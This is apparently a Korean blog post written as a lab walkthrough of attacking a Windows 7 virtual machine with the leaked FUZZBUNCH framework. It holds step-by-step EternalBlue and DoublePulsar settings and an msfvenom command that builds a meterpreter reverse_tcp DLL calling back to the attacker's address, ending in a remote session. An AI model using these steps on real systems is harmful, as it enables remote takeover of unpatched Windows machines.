---
layout: post
cover: 'assets/images/cover6.jpg'
title:  FUZZBUNCH를 사용한 해킹
date:   2017-01-01 01:01:01
tags: fiction
subclass: 'post tag-fiction'
categories: 'pjya0321'
navigation: True
logo: 'assets/images/ghost.png'
---


## 이터널블루와 더블풀자를 사용한 해킹
-----

해당 글은 가상환경 에서 실행했습니다.  
실제 환경에서 악용하면 나빠요 내책임아니에용  

쉐도우 프로커가 유출한 FUZZBUNCH 공부 기록  

윈도우XP 에 설정했다.  

필요한 준비물은  

https://github.com/misterch0c/shadowbroker  
쉐도우 브로커 자료 깃허브  
https://www.python.org/download/releases/2.6.6/  
파이썬 2.6  
https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/  
Pywin32 2.6버전  

요로케 3개  
왜 파이썬 2.6을 사용하는지는 잘모르지만 윈10에 2.6깔기 싫어서 가상에다 했다.  

그리고 환경변수 Path에 파이썬 경로 설정해준다.  

설정은 끝났다.  


cmd창에서 shadowbroker-master\windows 경로에 있는 fb.py 를 실행시킨다.  
실행시키기 전에 windows 경로에 listeningposts라는 폴더를 하나 생성해준다.  


![1](assets/postimage/Fuzz1.png)
fb.py를 실행하면 이런 화면이 보이고 순서대로 입력해준다  

타겟아이피 입력  
콜백아이피 입력(공격자 아이피)  
리다이렉션 사용은 알아서 (NO로 했음)  
로그를 기록할 디렉토리  

![2](assets/postimage/Fuzz2.png)

그리고  
프로젝트 인덱스는 대충 숫자 설정해주고  
프로젝트 이름도 설정 해주고   
로그 기록할껀지 말껀지 설정해주면  

퍼즈번치로 들어와짐  

use 명령어 입력하면 모듈들이 나온다  

![3](assets/postimage/Fuzz3.png)

use Eternalblue 을 입력하면 이터널블루가 실행된다.  

다양한 설정들 할꺼냐 안할꺼냐 하는데 그냥 디폴트값 계속 할꺼라서 엔터 눌러주면됨  
445포트는 SMB포트임  
중간에 Mode는 1번 해야 퍼즈번치사용함  

![4](assets/postimage/Fuzz4.png)

방화벽이 켜져있으면 위같은 화면이 나온다.  

![5](assets/postimage/Fuzz5.png)

타겟 을 윈7가상으로 바꾸고 방화벽을 내리고 다시 실행했다  
이번엔 이터널블루 석세스가 뜬다.  

![6](assets/postimage/Fuzz6.png)


칼리에서  

msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.254.129 lport=4444 -f dll -o /root/Desktop/kangol.dll  

명령어를 입력해서 악성 dll을 생성한다.  
그리고 그걸 공격하던 xp로 가져온다.  

![7](assets/postimage/Fuzz7.png)

핸들러 하나 설정해준다. 위 dll악성코드와 동일한설정으로 한다.  

![8](assets/postimage/Fuzz8.png)

그리고 메타스플로잇으로 방금만든 핸들러를 실행시켜준다  

![9](assets/postimage/Fuzz9.png)

다시 공격하던 XP로 돌아가서 use Doublepulsar 명령어를 입력해서 더블풀자를 실행한다. 

![10](assets/postimage/Fuzz10.png)

설정들을 디폴트로 해주다가  

중간에 펑션에서 우리가 사용할 악성코드는 DLL이기 때문에 2번 dll을 설정해준다.  
그리고 DLL페이로드 경로는 생성한 악성 DLL의 경로를 넣어준다.  

프로세스 네임을 디폴트값으로 해주면 윈7을 해킹할 때 금방 꺼지기 때문에  
explorer.exe로 설정한다.  

설정은 완료하면 더블풀자 석시드~ 나온다  

![11](assets/postimage/Fuzz11.png)

다시 칼리리눅스로 돌아가서 인터프리터 세션이 하나 실행됬다.  

![12](assets/postimage/Fuzz12.png)

리버싱하던 윈7이라 컴이름이 리버스엔지니어링으로 나온다 ㅇㅅㅇ  

![13](assets/postimage/Fuzz13.png)

sessions -i 1  
을 입력한다.  

그리고 이런저런 명령어를 처보면 해킹이 됬다는것을 알 수 있다.  
![14](assets/postimage/Fuzz14.png)

윈도우7의 바탕화면을 스크린샷 한 모습이다.  
끝  